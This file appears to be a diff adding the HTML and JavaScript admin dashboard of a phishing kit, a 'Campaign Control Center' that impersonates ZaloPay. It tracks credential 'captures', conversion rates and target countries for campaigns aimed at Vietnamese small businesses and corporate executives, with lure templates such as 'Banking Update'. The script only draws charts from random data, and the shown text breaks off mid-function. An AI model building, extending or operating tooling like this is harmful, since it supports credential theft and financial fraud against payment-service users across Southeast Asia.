@@ -1,0 +1,1092 @@
+
+
+Campaign Control Center - ZaloPay Admin Portal
+
+
+<div class="container-fluid">
+    <!-- Mobile Navigation Toggle -->
+    <button class="nav-toggle d-mobile-block d-tablet-none" onclick="toggleSidebar()" title="Toggle Navigation">
+        <i class="fas fa-bars"></i>
+    </button>
+
+    <!-- Page Header -->
+    <div class="d-flex justify-content-between align-items-center mb-4 mobile-center">
+        <div class="mobile-center">
+            <h1 class="h3 mb-0 text-gray-800">Campaign Control Center</h1>
+            <p class="text-muted">Manage và monitor phishing campaigns performance</p>
+        </div>
+        <div class="d-flex gap-2 flex-wrap">
+            <button class="btn btn-success touch-target" onclick="createNewCampaign()">
+                <i class="fas fa-plus me-1"></i><span class="d-mobile-none d-tablet-inline">New Campaign</span>
+            </button>
+            <button class="btn btn-primary touch-target" onclick="refreshCampaigns()">
+                <i class="fas fa-sync-alt me-1"></i><span class="d-mobile-none d-tablet-inline">Refresh</span>
+            </button>
+        </div>
+    </div>
+
+    <!-- Campaign Overview Cards - Mobile optimized -->
+    <div class="row mb-4 mobile-stack">
+        <div class="col-xl-3 col-lg-6 col-md-6 col-sm-6 col-12 mb-3">
+            <div class="card border-left-primary shadow h-100 py-2 touch-target">
+                <div class="card-body">
+                    <div class="d-flex align-items-center">
+                        <div class="flex-grow-1">
+                            <div class="text-mobile-xs font-weight-bold text-primary text-uppercase mb-1">Active Campaigns</div>
+                            <div class="h5 mb-0 font-weight-bold text-gray-800" id="activeCampaigns">8</div>
+                        </div>
+                        <div class="ms-3">
+                            <i class="fas fa-rocket fa-2x text-gray-300"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-xl-3 col-lg-6 col-md-6 col-sm-6 col-12 mb-3">
+            <div class="card border-left-success shadow h-100 py-2 touch-target">
+                <div class="card-body">
+                    <div class="d-flex align-items-center">
+                        <div class="flex-grow-1">
+                            <div class="text-mobile-xs font-weight-bold text-success text-uppercase mb-1">Total Visits Today</div>
+                            <div class="h5 mb-0 font-weight-bold text-gray-800" id="totalVisits">2,847</div>
+                        </div>
+                        <div class="ms-3">
+                            <i class="fas fa-eye fa-2x text-gray-300"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-xl-3 col-lg-6 col-md-6 col-sm-6 col-12 mb-3">
+            <div class="card border-left-warning shadow h-100 py-2 touch-target">
+                <div class="card-body">
+                    <div class="d-flex align-items-center">
+                        <div class="flex-grow-1">
+                            <div class="text-mobile-xs font-weight-bold text-warning text-uppercase mb-1">Conversion Rate</div>
+                            <div class="h5 mb-0 font-weight-bold text-gray-800" id="conversionRate">23.4%</div>
+                        </div>
+                        <div class="ms-3">
+                            <i class="fas fa-percentage fa-2x text-gray-300"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-xl-3 col-lg-6 col-md-6 col-sm-6 col-12 mb-3">
+            <div class="card border-left-danger shadow h-100 py-2 touch-target">
+                <div class="card-body">
+                    <div class="d-flex align-items-center">
+                        <div class="flex-grow-1">
+                            <div class="text-mobile-xs font-weight-bold text-danger text-uppercase mb-1">Captures Today</div>
+                            <div class="h5 mb-0 font-weight-bold text-gray-800" id="capturesToday">147</div>
+                        </div>
+                        <div class="ms-3">
+                            <i class="fas fa-crosshairs fa-2x text-gray-300"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Real-time Performance Chart - Mobile optimized -->
+    <div class="row mb-4 mobile-stack">
+        <div class="col-lg-8 col-md-12 mb-4">
+            <div class="card shadow">
+                <div class="card-header py-3 d-flex flex-row align-items-center justify-content-between">
+                    <h6 class="m-0 font-weight-bold text-primary">Real-time Campaign Performance</h6>
+                    <div class="d-flex gap-2 align-items-center">
+                        <select class="form-select form-select-sm touch-target" id="chartTimeRange" onchange="updateChart()">
+                            <option value="1h">Last Hour</option>
+                            <option value="24h" selected>Last 24 Hours</option>
+                            <option value="7d">Last 7 Days</option>
+                            <option value="30d">Last 30 Days</option>
+                        </select>
+                        <button class="btn btn-sm btn-outline-primary d-mobile-flex d-tablet-none touch-target" onclick="toggleChartView()">
+                            <i class="fas fa-expand"></i>
+                        </button>
+                    </div>
+                </div>
+                <div class="card-body">
+                    <div class="chart-container position-relative">
+                        <canvas id="performanceChart" height="300"></canvas>
+                        <div class="d-mobile-flex d-tablet-none justify-content-center mt-3 gap-2">
+                            <button class="btn btn-sm btn-outline-info touch-target" onclick="viewChartTable()">
+                                <i class="fas fa-table"></i> Bảng dữ liệu
+                            </button>
+                            <button class="btn btn-sm btn-outline-success touch-target" onclick="exportChartData()">
+                                <i class="fas fa-download"></i> Export
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-lg-4 col-md-12 mb-4">
+            <div class="card shadow">
+                <div class="card-header py-3 d-flex flex-row align-items-center justify-content-between">
+                    <h6 class="m-0 font-weight-bold text-primary">Geographic Distribution</h6>
+                    <button class="btn btn-sm btn-outline-secondary d-mobile-flex d-tablet-none touch-target" onclick="viewGeoDetails()">
+                        <i class="fas fa-info-circle"></i>
+                    </button>
+                </div>
+                <div class="card-body">
+                    <div class="chart-container position-relative">
+                        <canvas id="geographicChart" height="250"></canvas>
+                        <div class="d-mobile-flex d-tablet-none justify-content-center mt-3">
+                            <button class="btn btn-sm btn-outline-primary touch-target" onclick="viewFullGeoChart()">
+                                <i class="fas fa-expand-arrows-alt"></i> Xem đầy đủ
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Campaign Management Table - Mobile optimized -->
+    <div class="card shadow mb-4">
+        <div class="card-header py-3 d-flex flex-row align-items-center justify-content-between">
+            <h6 class="m-0 font-weight-bold text-primary">Campaign Management</h6>
+            <div class="d-flex gap-2 flex-wrap">
+                <button class="btn btn-sm btn-outline-primary d-mobile-flex d-tablet-none touch-target" onclick="toggleTableFilters()">
+                    <i class="fas fa-filter"></i> Filters
+                </button>
+                <div class="input-group d-mobile-none d-tablet-flex" style="width: 200px;">
+                    <select class="form-select form-select-sm touch-target" id="campaignFilter" onchange="filterCampaigns()">
+                        <option value="">All Status</option>
+                        <option value="active">Active</option>
+                        <option value="paused">Paused</option>
+                        <option value="completed">Completed</option>
+                        <option value="draft">Draft</option>
+                    </select>
+                </div>
+                <div class="input-group d-mobile-none d-tablet-flex" style="width: 150px;">
+                    <input type="text" class="form-control form-control-sm touch-target" placeholder="Search..." id="searchCampaigns" onkeyup="searchCampaigns()">
+                </div>
+            </div>
+        </div>
+        <div class="card-body">
+            <div class="table-responsive">
+                <table class="table table-hover">
+                    <thead>
+                        <tr>
+                            <th>Campaign</th>
+                            <th>Status</th>
+                            <th>Progress</th>
+                            <th>Visits</th>
+                            <th>Captures</th>
+                            <th>Conversion</th>
+                            <th>Target Regions</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>
+                                <div class="d-flex align-items-center">
+                                    <div class="me-3">
+                                        <div class="bg-primary rounded-circle d-flex align-items-center justify-content-center" style="width: 40px; height: 40px;">
+                                            <i class="fas fa-rocket text-white"></i>
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <div class="font-weight-bold">ZaloPay Merchant Q4 2025</div>
+                                        <div class="small text-muted">Vietnamese SME targeting</div>
+                                        <div class="small text-muted">
+                                            <i class="fas fa-calendar me-1"></i>Started: 2025-10-01
+                                        </div>
+                                    </div>
+                                </div>
+                            </td>
+                            <td>
+                                <span class="badge bg-success" id="status_campaign1">Active</span>
+                                <div class="small text-muted">Running for 4 days</div>
+                            </td>
+                            <td>
+                                <div class="progress" style="height: 20px;">
+                                    <div class="progress-bar bg-success" role="progressbar" style="width: 68%" aria-valuenow="68" aria-valuemin="0" aria-valuemax="100">68%</div>
+                                </div>
+                                <div class="small text-muted">680/1000 targets</div>
+                            </td>
+                            <td>
+                                <div class="font-weight-bold">3,247</div>
+                                <div class="small text-success">+247 today</div>
+                            </td>
+                            <td>
+                                <div class="font-weight-bold">847</div>
+                                <div class="small text-success">+67 today</div>
+                            </td>
+                            <td>
+                                <div class="font-weight-bold text-success">26.1%</div>
+                                <div class="small text-muted">Above target</div>
+                            </td>
+                            <td>
+                                <div class="d-flex gap-1">
+                                    <span class="badge bg-primary">🇻🇳 VN</span>
+                                    <span class="badge bg-secondary">🇹🇭 TH</span>
+                                </div>
+                            </td>
+                            <td>
+                                <div class="btn-group" role="group">
+                                    <button class="btn btn-sm btn-outline-primary" onclick="viewCampaignDetails('campaign1')" title="View Details">
+                                        <i class="fas fa-chart-line"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-warning" onclick="pauseCampaign('campaign1')" title="Pause Campaign">
+                                        <i class="fas fa-pause"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-info" onclick="editCampaign('campaign1')" title="Edit Settings">
+                                        <i class="fas fa-cog"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-success" onclick="cloneCampaign('campaign1')" title="Clone Campaign">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </div>
+                            </td>
+                        </tr>
+
+                        <tr>
+                            <td>
+                                <div class="d-flex align-items-center">
+                                    <div class="me-3">
+                                        <div class="bg-info rounded-circle d-flex align-items-center justify-content-center" style="width: 40px; height: 40px;">
+                                            <i class="fas fa-building text-white"></i>
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <div class="font-weight-bold">Executive Target Campaign</div>
+                                        <div class="small text-muted">High-value corporate executives</div>
+                                        <div class="small text-muted">
+                                            <i class="fas fa-calendar me-1"></i>Started: 2025-09-28
+                                        </div>
+                                    </div>
+                                </div>
+                            </td>
+                            <td>
+                                <span class="badge bg-success">Active</span>
+                                <div class="small text-muted">Running for 7 days</div>
+                            </td>
+                            <td>
+                                <div class="progress" style="height: 20px;">
+                                    <div class="progress-bar bg-warning" role="progressbar" style="width: 45%" aria-valuenow="45" aria-valuemin="0" aria-valuemax="100">45%</div>
+                                </div>
+                                <div class="small text-muted">89/200 targets</div>
+                            </td>
+                            <td>
+                                <div class="font-weight-bold">1,156</div>
+                                <div class="small text-warning">+23 today</div>
+                            </td>
+                            <td>
+                                <div class="font-weight-bold">234</div>
+                                <div class="small text-success">+12 today</div>
+                            </td>
+                            <td>
+                                <div class="font-weight-bold text-warning">20.2%</div>
+                                <div class="small text-muted">On target</div>
+                            </td>
+                            <td>
+                                <div class="d-flex gap-1">
+                                    <span class="badge bg-primary">🇻🇳 VN</span>
+                                </div>
+                            </td>
+                            <td>
+                                <div class="btn-group" role="group">
+                                    <button class="btn btn-sm btn-outline-primary" onclick="viewCampaignDetails('campaign2')">
+                                        <i class="fas fa-chart-line"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-warning" onclick="pauseCampaign('campaign2')">
+                                        <i class="fas fa-pause"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-info" onclick="editCampaign('campaign2')">
+                                        <i class="fas fa-cog"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-success" onclick="cloneCampaign('campaign2')">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </div>
+                            </td>
+                        </tr>
+
+                        <tr>
+                            <td>
+                                <div class="d-flex align-items-center">
+                                    <div class="me-3">
+                                        <div class="bg-warning rounded-circle d-flex align-items-center justify-content-center" style="width: 40px; height: 40px;">
+                                            <i class="fas fa-pause text-white"></i>
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <div class="font-weight-bold">Regional Expansion Test</div>
+                                        <div class="small text-muted">Thailand và Malaysia pilot</div>
+                                        <div class="small text-muted">
+                                            <i class="fas fa-calendar me-1"></i>Started: 2025-09-25
+                                        </div>
+                                    </div>
+                                </div>
+                            </td>
+                            <td>
+                                <span class="badge bg-warning">Paused</span>
+                                <div class="small text-muted">Paused 2 hours ago</div>
+                            </td>
+                            <td>
+                                <div class="progress" style="height: 20px;">
+                                    <div class="progress-bar bg-danger" role="progressbar" style="width: 12%" aria-valuenow="12" aria-valuemin="0" aria-valuemax="100">12%</div>
+                                </div>
+                                <div class="small text-muted">24/200 targets</div>
+                            </td>
+                            <td>
+                                <div class="font-weight-bold">456</div>
+                                <div class="small text-muted">+0 today</div>
+                            </td>
+                            <td>
+                                <div class="font-weight-bold">67</div>
+                                <div class="small text-muted">+0 today</div>
+                            </td>
+                            <td>
+                                <div class="font-weight-bold text-danger">14.7%</div>
+                                <div class="small text-muted">Below target</div>
+                            </td>
+                            <td>
+                                <div class="d-flex gap-1">
+                                    <span class="badge bg-secondary">🇹🇭 TH</span>
+                                    <span class="badge bg-secondary">🇲🇾 MY</span>
+                                </div>
+                            </td>
+                            <td>
+                                <div class="btn-group" role="group">
+                                    <button class="btn btn-sm btn-outline-primary" onclick="viewCampaignDetails('campaign3')">
+                                        <i class="fas fa-chart-line"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-success" onclick="resumeCampaign('campaign3')" title="Resume Campaign">
+                                        <i class="fas fa-play"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-info" onclick="editCampaign('campaign3')">
+                                        <i class="fas fa-cog"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-danger" onclick="stopCampaign('campaign3')" title="Stop Campaign">
+                                        <i class="fas fa-stop"></i>
+                                    </button>
+                                </div>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- Quick Actions Panel -->
+    <div class="row">
+        <div class="col-lg-6">
+            <div class="card shadow mb-4">
+                <div class="card-header py-3">
+                    <h6 class="m-0 font-weight-bold text-primary">Quick Campaign Actions</h6>
+                </div>
+                <div class="card-body">
+                    <div class="row">
+                        <div class="col-md-6 mb-3">
+                            <button class="btn btn-success w-100" onclick="createNewCampaign()">
+                                <i class="fas fa-plus mb-2"></i><br>
+                                Create New Campaign
+                            </button>
+                        </div>
+                        <div class="col-md-6 mb-3">
+                            <button class="btn btn-info w-100" onclick="importCampaign()">
+                                <i class="fas fa-upload mb-2"></i><br>
+                                Import Campaign
+                            </button>
+                        </div>
+                        <div class="col-md-6 mb-3">
+                            <button class="btn btn-warning w-100" onclick="pauseAllCampaigns()">
+                                <i class="fas fa-pause mb-2"></i><br>
+                                Pause All Active
+                            </button>
+                        </div>
+                        <div class="col-md-6 mb-3">
+                            <button class="btn btn-primary w-100" onclick="exportReports()">
+                                <i class="fas fa-download mb-2"></i><br>
+                                Export Reports
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-lg-6">
+            <div class="card shadow mb-4">
+                <div class="card-header py-3">
+                    <h6 class="m-0 font-weight-bold text-primary">Campaign Alerts</h6>
+                </div>
+                <div class="card-body">
+                    <div class="alert alert-success d-flex align-items-center" role="alert">
+                        <i class="fas fa-check-circle me-2"></i>
+                        <div>
+                            <strong>ZaloPay Q4 Campaign</strong> đạt milestone 500 captures
+                        </div>
+                    </div>
+                    <div class="alert alert-warning d-flex align-items-center" role="alert">
+                        <i class="fas fa-exclamation-triangle me-2"></i>
+                        <div>
+                            <strong>Executive Target</strong> conversion rate giảm 5% trong 24h qua
+                        </div>
+                    </div>
+                    <div class="alert alert-info d-flex align-items-center" role="alert">
+                        <i class="fas fa-info-circle me-2"></i>
+                        <div>
+                            <strong>Regional Expansion</strong> tạm dừng để optimization
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Campaign Details Modal -->
+<div class="modal fade" id="campaignDetailsModal" tabindex="-1">
+    <div class="modal-dialog modal-xl">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">Campaign Details</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body" id="campaignDetailsContent">
+                <!-- Campaign details will be loaded here -->
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                <button type="button" class="btn btn-primary" onclick="editCampaignInModal()">Edit Campaign</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- New Campaign Modal -->
+<div class="modal fade" id="newCampaignModal" tabindex="-1">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">Create New Campaign</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <form id="newCampaignForm">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="mb-3">
+                                <label class="form-label">Campaign Name</label>
+                                <input type="text" class="form-control" id="campaignName" required>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="mb-3">
+                                <label class="form-label">Campaign Code</label>
+                                <input type="text" class="form-control" id="campaignCode" required>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Description</label>
+                        <textarea class="form-control" id="campaignDescription" rows="3"></textarea>
+                    </div>
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="mb-3">
+                                <label class="form-label">Target Countries</label>
+                                <select class="form-select" id="targetCountries" multiple>
+                                    <option value="VN">Vietnam</option>
+                                    <option value="TH">Thailand</option>
+                                    <option value="MY">Malaysia</option>
+                                    <option value="SG">Singapore</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="mb-3">
+                                <label class="form-label">Campaign Template</label>
+                                <select class="form-select" id="campaignTemplate">
+                                    <option value="zalopay_merchant">ZaloPay Merchant</option>
+                                    <option value="banking_update">Banking Update</option>
+                                    <option value="business_verification">Business Verification</option>
+                                </select>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="mb-3">
+                                <label class="form-label">Start Date</label>
+                                <input type="datetime-local" class="form-control" id="startDate">
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="mb-3">
+                                <label class="form-label">End Date</label>
+                                <input type="datetime-local" class="form-control" id="endDate">
+                            </div>
+                        </div>
+                    </div>
+                </form>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                <button type="button" class="btn btn-primary" onclick="saveCampaign()">Create Campaign</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+<script>
+// Initialize charts
+let performanceChart, geographicChart;
+
+document.addEventListener('DOMContentLoaded', function() {
+    initializeCharts();
+    startRealTimeUpdates();
+});
+
+function initializeCharts() {
+    // Performance Chart
+    const ctx1 = document.getElementById('performanceChart').getContext('2d');
+    performanceChart = new Chart(ctx1, {
+        type: 'line',
+        data: {
+            labels: Array.from({length: 24}, (_, i) => `${i}:00`),
+            datasets: [
+                {
+                    label: 'Visits',
+                    data: generateRandomData(24, 50, 200),
+                    borderColor: '#007bff',
+                    backgroundColor: 'rgba(0, 123, 255, 0.1)',
+                    tension: 0.4
+                },
+                {
+                    label: 'Captures',
+                    data: generateRandomData(24, 10, 50),
+                    borderColor: '#28a745',
+                    backgroundColor: 'rgba(40, 167, 69, 0.1)',
+                    tension: 0.4
+                }
+            ]
+        },
+        options: {
+            responsive: true,
+            scales: {
+                y: {
+                    beginAtZero: true
+                }
+            },
+            plugins: {
+                legend: {
+                    display: true
+                }
+            }
+        }
+    });
+
+    // Geographic Chart
+    const ctx2 = document.getElementById('geographicChart').getContext('2d');
+    geographicChart = new Chart(ctx2, {
+        type: 'doughnut',
+        data: {
+            labels: ['Vietnam', 'Thailand', 'Malaysia', 'Singapore'],
+            datasets: [{
+                data: [68, 18, 10, 4],
+                backgroundColor: [
+                    '#007bff',
+                    '#28a745', 
+                    '#ffc107',
+                    '#dc3545'
+                ]
+            }]
+        },
+        options: {
+            responsive: true,
+            plugins: {
+                legend: {
+                    position: 'bottom'
+                }
+            }
+        }
+    });
+}
+
+function generateRandomData(count, min, max) {
+    return Array.from({length: count}, () => Math.floor(Math.random() * (max - min + 1)) + min);
+}
+
+function updateChart() {
+    const timeRange = document.getElementById('chartTimeRange').value;
+    // Update chart based on time range
+    showToast('Chart updated for ' + timeRange, 'info');
+}
+
+function startRealTimeUpdates() {
+    setInterval(() => {
+        // Update performance metrics
+        document.getElementById('totalVisits').textContent = (Math.floor(Math.random() * 100) + 2800).toLocaleString();
+        document.getElementById('capturesToday').textContent = Math.floor(Math.random() * 20) + 140;
+        
+        // Update conversion rate
+        const newRate = (Math.random() * 5 + 20).toFixed(1);
+        document.getElementById('conversionRate').textContent = newRate + '%';
+        
+        // Update chart data
+        if (performanceChart) {
+            const newVisits = Math.floor(Math.random() * 50) + 100;
+            const newCaptures = Math.floor(Math.random() * 20) + 15;
+            
+            performanceChart.data.datasets[0].data.push(newVisits);
+            performanceChart.data.datasets[1].data.push(newCaptures);
+            
+            if (performanceChart.data.datasets[0].data.length > 24) {
+                performanceChart.data.datasets[0].data.shift();
+                performanceChart.data.datasets[1].data.shift();
+            }
+            
+            performanceChart.update('none');
+        }
+    }, 30000); // Update every 30 seconds
+}
+
+// Campaign management functions
+function createNewCampaign() {
+    new bootstrap.Modal(document.getElementById('newCampaignModal')).show();
+}
+
+function saveCampaign() {
+    const form = document.getElementById('newCampaignForm');
+    if (form.checkValidity()) {
+        showToast('Campaign created successfully', 'success');
+        bootstrap.Modal.getInstance(document.getElementById('newCampaignModal')).hide();
+        form.reset();
+    } else {
+        showToast('Please fill all required fields', 'warning');
+    }
+}
+
+function viewCampaignDetails(campaignId) {
+    document.getElementById('campaignDetailsContent').innerHTML = `
+        <div class="row">
+            <div class="col-md-8">
+                <h6>Campaign Performance</h6>
+                <canvas id="campaignChart" height="100"></canvas>
+            </div>
+            <div class="col-md-4">
+                <h6>Campaign Settings</h6>
+                <table class="table table-sm">
+                    <tr><td><strong>Status:</strong></td><td><span class="badge bg-success">Active</span></td></tr>
+                    <tr><td><strong>Start Date:</strong></td><td>2025-10-01</td></tr>
+                    <tr><td><strong>Target:</strong></td><td>1,000 captures</td></tr>
+                    <tr><td><strong>Current:</strong></td><td>680 captures</td></tr>
+                </table>
+            </div>
+        </div>
+    `;
+    
+    new bootstrap.Modal(document.getElementById('campaignDetailsModal')).show();
+    
+    // Initialize mini chart
+    setTimeout(() => {
+        const ctx = document.getElementById('campaignChart').getContext('2d');
+        new Chart(ctx, {
+            type: 'line',
+            data: {
+                labels: ['Day 1', 'Day 2', 'Day 3', 'Day 4'],
+                datasets: [{
+                    label: 'Daily Captures',
+                    data: [156, 189, 167, 178],
+                    borderColor: '#007bff',
+                    tension: 0.4
+                }]
+            },
+            options: {
+                responsive: true,
+                scales: { y: { beginAtZero: true } }
+            }
+        });
+    }, 500);
+}
+
+function pauseCampaign(campaignId) {
+    if (confirm('Pause this campaign?')) {
+        document.getElementById('status_' + campaignId).textContent = 'Paused';
+        document.getElementById('status_' + campaignId).className = 'badge bg-warning';
+        showToast('Campaign paused', 'warning');
+    }
+}
+
+function resumeCampaign(campaignId) {
+    if (confirm('Resume this campaign?')) {
+        showToast('Campaign resumed', 'success');
+    }
+}
+
+function editCampaign(campaignId) {
+    showToast('Opening campaign editor...', 'info');
+}
+
+function cloneCampaign(campaignId) {
+    if (confirm('Clone this campaign?')) {
+        showToast('Campaign cloned successfully', 'success');
+    }
+}
+
+function stopCampaign(campaignId) {
+    if (confirm('Stop this campaign permanently?')) {
+        showToast('Campaign stopped', 'danger');
+    }
+}
+
+// Filter and search functions
+function filterCampaigns() {
+    const filter = document.getElementById('campaignFilter').value;
+    showToast('Filtering campaigns by: ' + (filter || 'All'), 'info');
+}
+
+function searchCampaigns() {
+    const search = document.getElementById('searchCampaigns').value;
+    if (search.length > 2) {
+        showToast('Searching campaigns...', 'info');
+    }
+}
+
+// Quick actions
+function importCampaign() {
+    showToast('Opening campaign import...', 'info');
+}
+
+function pauseAllCampaigns() {
+    if (confirm('Pause all active campaigns?')) {
+        showToast('All campaigns paused', 'warning');
+    }
+}
+
+function exportReports() {
+    showToast('Exporting campaign reports...', 'info');
+    setTimeout(() => {
+        showToast('Reports exported successfully', 'success');
+    }, 2000);
+}
+
+function refreshCampaigns() {
+    showToast('Refreshing campaign data...', 'info');
+    location.reload();
+}
+
+// Mobile-specific functions for campaign control
+function toggleSidebar() {
+    const sidebar = document.querySelector('.sidebar');
+    const backdrop = document.querySelector('.sidebar-backdrop');
+
+    if (sidebar && backdrop) {
+        sidebar.classList.toggle('show');
+        backdrop.classList.toggle('show');
+    }
+}
+
+function toggleTableFilters() {
+    // Show mobile filter panel
+    showToast('Mở bảng lọc dữ liệu', 'info');
+    // Implementation would show mobile filter modal
+}
+
+function toggleChartView() {
+    showToast('Chuyển chế độ xem biểu đồ', 'info');
+    // Implementation would toggle chart view mode
+}
+
+function viewChartTable() {
+    showToast('Xem bảng dữ liệu biểu đồ', 'info');
+    // Implementation would show data table modal
+}
+
+function exportChartData() {
+    showToast('Xuất dữ liệu biểu đồ...', 'info');
+    // Implementation would export chart data
+}
+
+function viewGeoDetails() {
+    showToast('Xem chi tiết phân bố địa lý', 'info');
+    // Implementation would show geographic details modal
+}
+
+function viewFullGeoChart() {
+    showToast('Mở biểu đồ địa lý đầy đủ', 'info');
+    // Implementation would open full screen chart
+}
+
+// Enhanced campaign management functions for mobile
+function viewCampaignDetails(campaignId) {
+    // Enhanced modal for mobile
+    const modalContent = document.getElementById('campaignDetailsContent');
+    modalContent.innerHTML = `
+        <div class="row mobile-stack">
+            <div class="col-md-8 col-12 mb-3">
+                <h6>Campaign Performance</h6>
+                <canvas id="campaignChart" height="200"></canvas>
+            </div>
+            <div class="col-md-4 col-12 mb-3">
+                <h6>Campaign Settings</h6>
+                <table class="table table-sm">
+                    <tr><td><strong>Status:</strong></td><td><span class="badge bg-success">Active</span></td></tr>
+                    <tr><td><strong>Start Date:</strong></td><td>2025-10-01</td></tr>
+                    <tr><td><strong>Target:</strong></td><td>1,000 captures</td></tr>
+                    <tr><td><strong>Current:</strong></td><td>680 captures</td></tr>
+                </table>
+                <div class="d-flex gap-2 mt-3 d-mobile-flex d-tablet-none">
+                    <button class="btn btn-sm btn-primary touch-target" onclick="editCampaignInModal()">
+                        <i class="fas fa-edit"></i> Edit
+                    </button>
+                    <button class="btn btn-sm btn-warning touch-target" onclick="pauseCampaign('${campaignId}')">
+                        <i class="fas fa-pause"></i> Pause
+                    </button>
+                </div>
+            </div>
+        </div>
+    `;
+
+    new bootstrap.Modal(document.getElementById('campaignDetailsModal')).show();
+
+    // Initialize mini chart for mobile
+    setTimeout(() => {
+        const ctx = document.getElementById('campaignChart');
+        if (ctx) {
+            new Chart(ctx, {
+                type: 'line',
+                data: {
+                    labels: ['Day 1', 'Day 2', 'Day 3', 'Day 4'],
+                    datasets: [{
+                        label: 'Daily Captures',
+                        data: [156, 189, 167, 178],
+                        borderColor: '#007bff',
+                        tension: 0.4
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    scales: {
+                        y: {
+                            beginAtZero: true,
+                            ticks: { font: { size: 10 } }
+                        },
+                        x: {
+                            ticks: { font: { size: 9 } }
+                        }
+                    }
+                }
+            });
+        }
+    }, 500);
+}
+
+function pauseCampaign(campaignId) {
+    if (confirm('Tạm dừng campaign này?')) {
+        document.getElementById('status_' + campaignId).textContent = 'Paused';
+        document.getElementById('status_' + campaignId).className = 'badge bg-warning';
+        showToast('Campaign đã được tạm dừng', 'warning');
+    }
+}
+
+function resumeCampaign(campaignId) {
+    if (confirm('Tiếp tục campaign này?')) {
+        showToast('Campaign đã được tiếp tục', 'success');
+    }
+}
+
+function editCampaign(campaignId) {
+    showToast('Mở trình chỉnh sửa campaign...', 'info');
+    // Implementation would open edit modal
+}
+
+function cloneCampaign(campaignId) {
+    if (confirm('Sao chép campaign này?')) {
+        showToast('Campaign đã được sao chép thành công', 'success');
+    }
+}
+
+function stopCampaign(campaignId) {
+    if (confirm('Dừng campaign này vĩnh viễn?')) {
+        showToast('Campaign đã được dừng', 'danger');
+    }
+}
+
+// Touch gesture support for charts
+let chartStartX = 0;
+let chartStartY = 0;
+
+document.addEventListener('touchstart', function(e) {
+    if (e.target.closest('canvas')) {
+        chartStartX = e.changedTouches[0].screenX;
+        chartStartY = e.changedTouches[0].screenY;
+    }
+});
+
+document.addEventListener('touchend', function(e) {
+    if (e.target.closest('canvas')) {
+        const chartEndX = e.changedTouches[0].screenX;
+        const chartEndY = e.changedTouches[0].screenY;
+        handleChartGesture(chartEndX, chartEndY);
+    }
+});
+
+function handleChartGesture(endX, endY) {
+    const deltaX = chartStartX - endX;
+    const deltaY = chartStartY - endY;
+    const minSwipeDistance = 30;
+
+    if (Math.abs(deltaX) > Math.abs(deltaY) && Math.abs(deltaX) > minSwipeDistance) {
+        if (deltaX > 0) {
+            // Swipe left - next time period
+            changeChartTimeRange('next');
+        } else {
+            // Swipe right - previous time period
+            changeChartTimeRange('prev');
+        }
+    }
+}
+
+function changeChartTimeRange(direction) {
+    const select = document.getElementById('chartTimeRange');
+    const options = select.options;
+    const currentIndex = select.selectedIndex;
+
+    if (direction === 'next' && currentIndex < options.length - 1) {
+        select.selectedIndex = currentIndex + 1;
+        updateChart();
+    } else if (direction === 'prev' && currentIndex > 0) {
+        select.selectedIndex = currentIndex - 1;
+        updateChart();
+    }
+}
+
+// Enhanced real-time updates for mobile
+function startRealTimeUpdates() {
+    setInterval(() => {
+        // Update performance metrics with animation
+        const visitsElement = document.getElementById('totalVisits');
+        const capturesElement = document.getElementById('capturesToday');
+
+        if (visitsElement) {
+            const currentVisits = parseInt(visitsElement.textContent.replace(/,/g, ''));
